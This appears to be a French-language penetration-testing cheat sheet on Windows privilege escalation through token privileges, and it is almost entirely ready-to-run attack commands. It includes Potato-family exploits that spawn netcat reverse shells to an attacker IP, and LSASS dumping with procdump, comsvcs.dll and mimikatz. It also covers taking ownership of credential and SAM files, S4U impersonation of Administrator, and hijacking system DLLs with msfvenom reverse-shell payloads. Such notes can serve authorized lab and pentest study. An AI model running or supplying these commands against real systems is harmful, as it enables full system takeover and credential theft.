
 - [[#SeImpersonate & SeAssignPrimaryToken]]
 - [[#SeDebugPrivilege]]
 - [[#SeTakeOwnershipPrivilege]]
 - [[#SeTcbPrivilege]]
 - [[#SeManageVolumePrivilege]]

# 1. Identifier les privilèges utilisateur

```powershell
whoami /priv
```



---

# SeImpersonate & SeAssignPrimaryToken


> [!Info]
> Chaque processus a un token avec des informations sur le compte qui l'a lancé.
> Le privilege SeImpersonate permet d'utiliser ce token.

## Attaques POTATO

> [!tip]
> Permet de faire communiquer un processus qui tourne en tant que SYSTEM au processus lancé par POTATO

- [ ] [[#JuicyPotato (Pre 2019 / Win 10.0.17763)]]
- [ ] [[#RoguePotato (Post 2019)]]
- [ ] [[#PrintSpoofer (Post 2019)]]


# JuicyPotato (Pre 2019 / Win 10.0.17763)

https://github.com/ohpe/juicy-potato
https://github.com/int0x33/nc.exe/
https://github.com/ohpe/juicy-potato/tree/master/CLSID

Passer NC.exe et JuicyPotato sur la cible


Sur machine attaquant

```bash
sudo nc -nvlp 8443
```

sur target

```shell
C:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\nc.exe <ip_attacker> 8443 -e cmd.exe" -t *
```

si COM -> recv failed with error: 10038 -> Bruteforce de CLSID

```powershell
foreach($clsid in ((cat .\CLSID.list))){c:\windows\temp\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\windows\temp\nc.exe 10.10.14.63 8443 -e cmd.exe" -t * -c $clsid}
```


# RoguePotato (2019 / Win 10.0.17763)

https://github.com/antonioCoco/RoguePotato
https://github.com/int0x33/nc.exe/

Passer NC.exe et RoguePotato sur la cible

## Depuis linux

Sur machine attaquant

```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<ip_target>:9999
```

```bash
nc -lvnp 1234
```

sur target

```cmd
c:\Users\Public\RoguePotato.exe -r <attacker_ip> -e "C:\Users\Public\nc.exe <attacker_ip> <listener_port> -e cmd.exe" -l 9999
```

## Depuis Windows

Sur machine attaquant

```cmd
c:\Users\Public\RogueOxidResolver.exe -l 9999
```


sur target

```cmd
c:\Users\Public\RoguePotato.exe -r <attacker_ip> -e "C:\Users\Public\nc.exe <attacker_ip> <listener_port> -e cmd.exe" -l 9999
```


# PrintSpoofer (2019 / Win 10.0.17763)

https://github.com/itm4n/PrintSpoofer
https://github.com/int0x33/nc.exe/

Passer NC.exe et PrintSpoofer sur la cible


Sur attacker

```shell
nc -lnvp 8443
```

Sur target

```shell
C:\Users\Public\PrintSpoofer.exe -c "C:\Users\Public\nc.exe <ip_attacker> 8443 -e cmd"
```


# GodPotato (2012 à 2022)

https://github.com/BeichenDream/GodPotato/releases/tag/V1.20
https://github.com/int0x33/nc.exe/

Passer NC.exe et GodPotato sur la cible


Sur attacker

```shell
nc -lnvp 8443
```

Sur target

```shell
C:\Users\Public\GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe <ip_attacker> 8443"
```





---
# SeDebugPrivilege


## 1. Dump LSASS

### Procdump (Sysinternals)

https://learn.microsoft.com/en-us/sysinternals/downloads/procdump

Dump LSASS avec procdump

```cmd-session
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### comsvcs.dll

Alternative avec comsvcs.dll

```powershell
Get-Process lsass
```

```cmd
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <pid> C:\temp\lsass.dmp full
```

### Mimikatz

Lire lsass.dmp avec Mimikatz

```cmd
mimikatz.exe
```

```cmd-session
log
privilege::debug
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```


## 2. SYSTEM RCE

> [!TIP]
> Exécute un sous processus a partir d'un processus parent lancé en tant que SYSTEM


Récuperer pid de winlogon (qui s'execute en tant que SYSTEM)

```powershell
Get-Process winlogon
```

### PSGetSystem

https://github.com/decoder-it/psgetsystem

```powershell
. .\psgetsys.ps1 
```

cmd local

```powershell
ImpersonateFromParentPid -ppid <parentpid> -command "c:\Windows\System32\cmd.exe" -cmdargs ""
```

reverse shell avec nc.exe

```powershell
ImpersonateFromParentPid -ppid <parentpid> -command "c:\Windows\System32\nc.exe" -cmdargs "<ip_attacker> <listener_port>"
```




---

# SeTakeOwnershipPrivilege


> [!TIP]
> Permet de prendre le contrôle d'un objet et de s'octroyer des droits dessus
> Utile pour lire des fichiers sur lesquels nous n'avons pas les droits

Exemple de fichiers utiles:
```shell
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

N'importe quel fichier de config egalement / creds / DB

## EnableAllTokenPrivs

https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
### 1. Activer le privilège

```powershell-session
Import-Module .\Enable-Privilege.ps1
```

```powershell-session
.\EnableAllTokenPrivs.ps1
```

Check si le droit est bien activé

```powershell-session
whoami /priv
```


### 2. Checker les droit sur l'objet cible (partage par exemple)

```powershell-session
cmd /c dir /q 'C:\Department Shares\Private\IT'
```


### 3. Take ownership sur l'objet

```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```


### 4. Confirmer le changement de propriétaire

```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```


### 5. S'octroyer le control total sur l'objet

```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant <user>:F
```


---
# SeTcbPrivilege

> [!TIP]
> Permet d'agir en tant que l'OS.
> Possibilité d'impersoner n'importe quel user en utilisant S4U logon.


### 1. Activer le Token dans un premier temp

https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

```
.\EnableAllTokenPrivs.ps1
```

### 2. Importer le module NtObjectManager

https://www.powershellgallery.com/packages/NtObjectManager/2.0.1

Si pas de connexion internet sur la target, sauvegarder le module depuis la machine de l'attaquant et l'importer manuellement.

```
Save-Module -Name NtObjectManager -RequiredVersion 2.0.1 -Path C:/
```

import du module 

```
import-module .\NtObjectManager\2.0.1\NtObjectManager.psd1
```

### 3. Requête d'un token Administrator

Requête d'un token pour le compte Administrator

```
$token = Get-NtToken -S4U -User "Administrator"
```

Extraire le handle

```
$handle = $token.Handle
```

Lancer le process avec ProcessEx
https://github.com/jborean93/ProcessEx/tree/main

```
Start-ProcessWith cmd.exe -Token $handle
```

Si impossible de lancer un processus, il est toujours possible d'usurper le compte administrator et naviguer sur le FS en tant que tel. 

Impersonation du user

```
$token.Impersonate()
```

Possible ensuite de faire un Service Binary Hijacking, DLL hijacking... ou de modifier des fichiers accessibles pour le user Administrator.


---
# SeManageVolumePrivilege

> [!TIP]
> Permet de s'octroyer tous les droits sur C:\
> Permet ensuite de faire du DLL hijacking, Service Binary hijacking, voler clé privé de CA...
> 

https://github.com/CsEnox/SeManageVolumeExploit -> précompilé
https://github.com/xct/SeManageVolumeAbuse

```
.\SeManageVolumeExploit.exe
```

Vérifier les droits sur C:\

```
icacls C:\
```

## DLL Hijacking

### Printconfig.dll

Path : "C:\Windows\System32\spool\drivers\x64\3"

1. Générer Printconfig.dll avec MSFVENOM

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.177 LPORT=443 -f dll -o Printconfig.dll
```

2. Renomer la dll originale sur la target

```
mv "C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll" "C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll.old"
```

3. Copier notre dll dans le path

```
cp Printconfig.dll "C:\Windows\System32\spool\drivers\x64\3\"
```

4. Initier un PrintNotify object qui charge la DLL en tant que SYSTEM.

```
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```

### tzres.dll

Path:  C:\Windows\System32\wbem\

1. Générer tzres.dll avec MSFVENOM

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.177 LPORT=443 -f dll -o tzres.dll
```

2. Renomer la dll originale sur la target

```
mv "C:\Windows\System32\wbem\tzres.dll" "C:\Windows\System32\wbem\tzres.dll.old"
```

3. Copier notre dll dans le path

```
cp tzres.dll "C:\Windows\System32\wbem\"
```

4. Executer la commande systeminfo qui charge la DLL en tant que SYSTEM.

```
systeminfo
```




